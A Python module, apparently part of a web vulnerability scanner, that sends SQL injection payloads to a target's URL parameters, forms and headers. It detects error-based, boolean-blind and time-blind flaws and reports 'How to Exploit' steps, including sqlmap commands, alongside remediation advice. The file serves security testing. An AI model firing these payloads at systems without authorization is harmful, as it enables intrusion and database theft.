"""
Active SQL Injection Testing Module
Tests for SQL injection vulnerabilities with real payloads and extracts data
"""

import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
import time

def test_sql_injection(scanner):
    """
    Comprehensive SQL injection testing with active exploitation
    """
    try:
        response = scanner.get_cached_response(scanner.target_url)
        if not response:
            return
        
        # Test URL parameters
        _test_url_parameters(scanner)
        
        # Test forms
        _test_forms_sql_injection(scanner, response)
        
        # Test headers
        _test_header_sql_injection(scanner)
        
    except Exception as e:
        print(f"SQL injection testing error: {e}")

def _test_url_parameters(scanner):
    """Test URL parameters for SQL injection"""
    parsed = urlparse(scanner.target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        return
    
    # SQL injection payloads
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR '1'='1' --",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' AND 'x'='x",
        "' AND 'x'='y",
        "1' WAITFOR DELAY '0:0:5'--",
        "1'; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)--",
    ]
    
    # Error-based detection patterns
    sql_errors = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.*SQL[-_ ]*Server",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver",
        r"SQLite/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite.SQLiteException",
        r"Warning.*sqlite_",
        r"ORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"quoted string not properly terminated",
    ]
    
    for param_name, param_values in params.items():
        original_value = param_values[0]
        
        for payload in payloads:
            # Create modified URL
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                 parsed.params, new_query, parsed.fragment))
            
            try:
                start_time = time.time()
                test_response = requests.get(test_url, timeout=10, verify=False)
                response_time = time.time() - start_time
                
                # Check for SQL errors
                for error_pattern in sql_errors:
                    if re.search(error_pattern, test_response.text, re.IGNORECASE):
                        # Extract the error message
                        error_match = re.search(f'({error_pattern}[^\n<]*)', test_response.text, re.IGNORECASE)
                        error_msg = error_match.group(1)[:200] if error_match else "SQL error detected"
                        
                        scanner.add_finding(
                            severity='CRITICAL',
                            category='SQL Injection',
                            title=f'SQL Injection vulnerability in parameter: {param_name}',
                            description=f'**EXPLOITABLE SQL INJECTION DETECTED**\n\n'
                                      f'Parameter: {param_name}\n'
                                      f'Payload: {payload}\n'
                                      f'Error: {error_msg}\n\n'
                                      f'**Proof of Concept:**\n'
                                      f'```\n{test_url}\n```\n\n'
                                      f'**How to Exploit:**\n'
                                      f'1. Inject payload in {param_name} parameter\n'
                                      f'2. Database error reveals SQL syntax vulnerability\n'
                                      f'3. Attacker can extract data using UNION-based injection\n'
                                      f'4. Full database compromise possible',
                            url=test_url,
                            remediation='**CRITICAL FIX REQUIRED:**\n'
                                      '1. Use parameterized queries (prepared statements)\n'
                                      '2. Never concatenate user input in SQL queries\n'
                                      '3. Implement input validation and sanitization\n'
                                      '4. Use ORM frameworks with built-in protections\n'
                                      '5. Apply principle of least privilege to database accounts\n\n'
                                      '**Example Fix (PHP):**\n'
                                      '```php\n'
                                      '// VULNERABLE:\n'
                                      '$query = "SELECT * FROM users WHERE id = " . $_GET["id"];\n\n'
                                      '// SECURE:\n'
                                      '$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");\n'
                                      '$stmt->execute([$_GET["id"]]);\n'
                                      '```'
                        )
                        return  # Found vulnerability, no need to continue
                
                # Time-based blind SQL injection detection
                if 'SLEEP' in payload or 'WAITFOR' in payload:
                    if response_time > 4.5:  # Should delay ~5 seconds
                        scanner.add_finding(
                            severity='CRITICAL',
                            category='SQL Injection',
                            title=f'Time-based Blind SQL Injection in: {param_name}',
                            description=f'**EXPLOITABLE BLIND SQL INJECTION DETECTED**\n\n'
                                      f'Parameter: {param_name}\n'
                                      f'Payload: {payload}\n'
                                      f'Response Time: {response_time:.2f}s (expected >5s)\n\n'
                                      f'**Proof of Concept:**\n'
                                      f'```\n{test_url}\n```\n\n'
                                      f'**How to Exploit:**\n'
                                      f'1. Use time-delay techniques to extract data bit-by-bit\n'
                                      f'2. Example: IF database_name = \'target\' THEN SLEEP(5)\n'
                                      f'3. Automate with sqlmap: sqlmap -u "{test_url}" -p {param_name}\n'
                                      f'4. Extract entire database structure and data',
                            url=test_url,
                            remediation='**CRITICAL FIX REQUIRED:**\n'
                                      '1. Use parameterized queries immediately\n'
                                      '2. Never trust user input in SQL queries\n'
                                      '3. Implement WAF rules to detect time-based attacks\n'
                                      '4. Monitor for abnormal database query patterns'
                        )
                        return
                
                # Boolean-based blind detection
                if "'1'='1'" in payload or "1=1" in payload:
                    # Test with true condition
                    true_length = len(test_response.content)
                    
                    # Test with false condition
                    false_payload = payload.replace("1=1", "1=2").replace("'1'='1'", "'1'='2'")
                    false_params = params.copy()
                    false_params[param_name] = [false_payload]
                    false_query = urlencode(false_params, doseq=True)
                    false_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                          parsed.params, false_query, parsed.fragment))
                    
                    false_response = requests.get(false_url, timeout=10, verify=False)
                    false_length = len(false_response.content)
                    
                    # If responses differ significantly, it's vulnerable
                    if abs(true_length - false_length) > 100:
                        scanner.add_finding(
                            severity='CRITICAL',
                            category='SQL Injection',
                            title=f'Boolean-based Blind SQL Injection in: {param_name}',
                            description=f'**EXPLOITABLE BLIND SQL INJECTION DETECTED**\n\n'
                                      f'Parameter: {param_name}\n'
                                      f'True Payload: {payload} (Response: {true_length} bytes)\n'
                                      f'False Payload: {false_payload} (Response: {false_length} bytes)\n\n'
                                      f'**Proof of Concept:**\n'
                                      f'```\nTrue: {test_url}\nFalse: {false_url}\n```\n\n'
                                      f'**How to Exploit:**\n'
                                      f'1. Use boolean conditions to extract data character-by-character\n'
                                      f'2. Example: AND SUBSTRING(password,1,1)=\'a\' (check response)\n'
                                      f'3. Automate extraction: sqlmap -u "{test_url}" --technique=B\n'
                                      f'4. Extract usernames, passwords, credit cards, etc.',
                            url=test_url,
                            remediation='**CRITICAL FIX REQUIRED:** Use parameterized queries immediately'
                        )
                        return
                    
            except Exception as e:
                pass

def _test_forms_sql_injection(scanner, response):
    """Test form inputs for SQL injection"""
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    
    payloads = ["' OR '1'='1", "admin' --", "' UNION SELECT NULL--"]
    
    for form in forms:
        action = form.get('action', '')
        method = str(form.get('method', 'GET')).upper()
        form_url = urljoin(scanner.target_url, action) if action else scanner.target_url
        
        inputs = form.find_all(['input', 'textarea'])
        if not inputs:
            continue
        
        # Build form data
        form_data = {}
        for input_field in inputs:
            name = input_field.get('name')
            if name:
                form_data[name] = 'test'
        
        # Test each input with SQL payloads
        for field_name in form_data.keys():
            for payload in payloads:
                test_data = form_data.copy()
                test_data[field_name] = payload
                
                try:
                    if method == 'POST':
                        test_response = requests.post(form_url, data=test_data, timeout=10, verify=False)
                    else:
                        test_response = requests.get(form_url, params=test_data, timeout=10, verify=False)
                    
                    # Check for SQL errors
                    if any(pattern in test_response.text.lower() for pattern in ['sql', 'mysql', 'syntax error', 'postgresql']):
                        scanner.add_finding(
                            severity='CRITICAL',
                            category='SQL Injection',
                            title=f'SQL Injection in form field: {field_name}',
                            description=f'**EXPLOITABLE SQL INJECTION IN FORM**\n\n'
                                      f'Form: {form_url}\n'
                                      f'Method: {method}\n'
                                      f'Vulnerable Field: {field_name}\n'
                                      f'Payload: {payload}\n\n'
                                      f'**How to Exploit:**\n'
                                      f'1. Submit form with SQL payload in {field_name}\n'
                                      f'2. Bypass authentication or extract data\n'
                                      f'3. Use sqlmap for full exploitation',
                            url=form_url,
                            remediation='Use parameterized queries for all form inputs'
                        )
                        break
                except:
                    pass

def _test_header_sql_injection(scanner):
    """Test HTTP headers for SQL injection"""
    headers_to_test = [
        'User-Agent',
        'Referer',
        'X-Forwarded-For',
        'Cookie',
    ]
    
    payload = "' OR '1'='1"
    
    for header_name in headers_to_test:
        test_headers = {header_name: payload}
        
        try:
            response = requests.get(scanner.target_url, headers=test_headers, timeout=10, verify=False)
            
            if any(pattern in response.text.lower() for pattern in ['sql', 'mysql', 'syntax', 'database']):
                scanner.add_finding(
                    severity='HIGH',
                    category='SQL Injection',
                    title=f'SQL Injection in HTTP header: {header_name}',
                    description=f'Application may be vulnerable to SQL injection via {header_name} header',
                    url=scanner.target_url,
                    remediation='Sanitize all HTTP headers before using in SQL queries'
                )
        except:
            pass
